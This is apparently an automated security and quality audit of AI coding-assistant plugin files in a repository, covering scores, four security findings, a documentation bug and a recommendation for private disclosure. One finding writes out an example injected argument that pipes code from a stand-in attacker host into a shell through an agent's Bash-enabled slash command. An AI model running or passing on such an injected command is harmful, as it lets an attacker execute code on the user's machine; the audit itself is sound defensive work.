# NLPM Audit: microsoft/SkillOpt
**Date**: 2026-04-06  |  **Artifacts**: 6  |  **Strategy**: single
**NL Score**: 98/100
**Security**: BLOCKED
**Bugs**: 1  |  **Quality Issues**: 0  |  **Security Findings**: 4

## NL Score Summary
| File | Type | Score | Top Issue |
|------|------|-------|-----------|
| plugins/claude-code/commands/skillopt-sleep.md | command | 90 | Documents a `--preferences "<house rules>"` CLI flag that does not exist on the underlying `python -m skillopt_sleep` CLI |
| plugins/claude-code/.claude-plugin/plugin.json | manifest | 100 | None |
| plugins/claude-code/hooks/hooks.json | hook-config | 100 | None |
| plugins/claude-code/skills/skillopt-sleep/SKILL.md | skill | 100 | None |
| plugins/codex/skills/skillopt-sleep/SKILL.md | skill | 100 | None |
| plugins/openclaw/SKILL.md | skill | 100 | None |

## Security Scan
| Severity | Count |
|----------|-------|
| Critical | 0 |
| High | 2 |
| Medium | 1 |
| Low | 1 |

### Execution Surface Inventory
| Surface | Files |
|---------|-------|
| Hooks | `plugins/claude-code/hooks/hooks.json`, `plugins/claude-code/hooks/on-session-end.sh` |
| Plugin runner scripts | `plugins/claude-code/scripts/sleep.sh`, `plugins/claude-code/scripts/run-sleep.sh`, `plugins/claude-code/scripts/install-cron.sh`, `plugins/run-sleep.sh`, `plugins/codex/install.sh` |
| OpenClaw backend scripts | `plugins/openclaw/run_sleep.py`, `plugins/openclaw/slash_sleep.py`, `plugins/openclaw/run_sleep_cron.sh`, `plugins/openclaw/skillopt_sleep_openclaw.py`, `plugins/openclaw/config.json` |
| MCP configs | none found |
| Package manifests | `requirements.txt` (repo root; no `package.json` present) |
| Repo-root scripts (unrelated ML benchmark tooling, out of the plugin's execution surface — spot-checked, no dangerous patterns) | `scripts/run_alfworld.sh`, `scripts/run_searchqa.sh`, `scripts/run_spreadsheetbench.sh`, `scripts/eval_only.py`, `scripts/train.py`, `scripts/materialize_searchqa.py` |

### Security Findings
| # | Severity | File | Line | Pattern | Description |
|---|----------|------|------|---------|--------------|
| 1 | High | plugins/openclaw/slash_sleep.py | 107 | os.system() | `rc = os.system(" ".join(f'"{c}"' for c in cmd))` shells out via `os.system` instead of `subprocess.run(list)`. The argument list is built from `sys.executable`, a fixed script path, and a `category` value constrained by `argparse(choices=...)`, so no attacker-controlled string currently reaches the shell — but the pattern is fragile: any future caller that adds an unvalidated field to `cmd` turns this into command injection. |
| 2 | High | plugins/claude-code/commands/skillopt-sleep.md | 15 | unsanitized-arg-to-bash | `allowed-tools: Bash, Read` (line 4) grants Bash, and the command body interpolates the raw slash-command argument (`## Requested action: $ARGUMENTS`, line 15) into a bash invocation template (`"${CLAUDE_PLUGIN_ROOT}/scripts/sleep.sh" <action> ...`, lines 24-26) with no explicit instruction to validate `$ARGUMENTS` against the documented action whitelist before executing it. A crafted invocation (e.g. `/skillopt-sleep "; curl evil.example/x \| sh #"`) relies entirely on the invoking model's judgment rather than a stated validation step in the artifact. |
| 3 | Medium | plugins/openclaw/skillopt_sleep_openclaw.py | 41 | credential-to-configurable-endpoint | `base = os.environ.get("DEEPSEEK_BASE_URL", "https://api.deepseek.com/v1")` is used unchecked as the target of the outbound request that carries `Authorization: Bearer <DEEPSEEK_API_KEY>` (line ~54). If `DEEPSEEK_BASE_URL` is ever set to an unintended host (misconfiguration or a compromised environment), the API key is sent there instead of DeepSeek. This mirrors a common SDK convenience pattern (e.g. OpenAI's `base_url` override) so may be intentional, but there is no allow-list check. |
| 4 | Low | requirements.txt | 2 | unpinned-semver | All dependencies (`openai>=1.30.0`, `pyyaml>=6.0`, `numpy>=1.24.0`, `openpyxl>=3.1.0`, `azure-identity>=1.15.0`, `azure-core>=1.30.0`, `httpx>=0.27.0`) use only a lower-bound constraint with no upper bound, so a future breaking major release installs silently. |

## Bugs (PR-worthy)
| # | File | Issue | Impact |
|---|------|-------|--------|
| 1 | plugins/claude-code/commands/skillopt-sleep.md | Line 42 tells the user/agent to add `--preferences "<your house rules>"` to steer the optimizer, framed as a flag on the same runner invocation described in the "How to run it" section. Verified against `skillopt_sleep/__main__.py`: `_add_common()` (lines 68-93) enumerates every accepted flag and there is no `--preferences` entry anywhere in the module; `parser.parse_args(argv)` (line 323) is strict (not `parse_known_args`), so an unrecognized flag raises `SystemExit` with "unrecognized arguments". The sibling `codex` and `openclaw` SKILL.md files correctly document `preferences` only as a `~/.skillopt-sleep/config.json` **config key**, never as a CLI flag — confirming this is a doc-only regression specific to the Claude Code command file. | Following the documented instruction literally aborts the run with an argparse error instead of steering the optimizer; user has to independently discover `preferences` must go in `config.json` instead. |

## Security Fixes (PR-worthy, Medium/Low only)
| # | File | Issue | Suggested Fix |
|---|------|-------|----------------|
| 1 | plugins/openclaw/skillopt_sleep_openclaw.py | `DEEPSEEK_BASE_URL` env var is used unchecked as the destination for a request carrying the DeepSeek API key in an `Authorization` header | Validate `DEEPSEEK_BASE_URL` against an allow-list of expected hosts (or drop the override) before attaching the `Authorization` header |
| 2 | requirements.txt | Every dependency is pinned with `>=` only, no upper bound | Add upper-bound caps (e.g. `openai>=1.30.0,<2`) or adopt a lockfile so a breaking major release can't install silently |

## Quality Issues (informational)
| # | File | Issue | Penalty |
|---|------|-------|---------|
| — | — | No additional quality issues beyond the bug above; frontmatter, examples-not-applicable (no agents among these 6 artifacts), numbered steps, empty-input handling, and vague-quantifier checks were all clean across all 6 files. | 0 |

## Cross-Component
- **plugins/claude-code/README.md:43** instructs `/plugin marketplace add ./skillopt-sleep-plugin`, but no `skillopt-sleep-plugin` directory exists anywhere in the repo (verified via directory listing). The actual plugin root, per `plugins/claude-code/.claude-plugin/marketplace.json`'s `source.path`, is `plugins/claude-code`. This is a stale/incorrect local install path in the README (not one of the 6 scored artifacts, but directly downstream of `plugin.json` + `marketplace.json`, both in scope).
- No orphaned components found: every script/hook path referenced from the 6 NL artifacts (`scripts/sleep.sh`, `scripts/install-cron.sh`, `scripts/run-sleep.sh`, `hooks/on-session-end.sh`, `plugins/run-sleep.sh`, experiment modules under `skillopt_sleep/experiments/`) resolves to a real file on disk, and all documented CLI flags except the one bug above are verified to exist in `skillopt_sleep/__main__.py`'s argparse definitions.
- Terminology and CLI-flag/config-key documentation is consistent and cross-checked across all three platform SKILL.md files (Claude Code, Codex, OpenClaw): backend names, config keys, and cycle stage names all match the shared engine's actual behavior.

## Recommendation
BLOCKED — do not submit PRs. File private security report. Two High-severity findings must be privately disclosed and resolved (or accepted as fixed-by-design) before any public PR: the `os.system()` pattern in `plugins/openclaw/slash_sleep.py`, and the unsanitized-argument-to-Bash pattern in `plugins/claude-code/commands/skillopt-sleep.md`. Once the security gate clears, the NL bug (`--preferences` broken CLI-flag reference) and the two Medium/Low security fixes (DeepSeek base-URL validation, `requirements.txt` version pinning) are ready to go out as PRs.
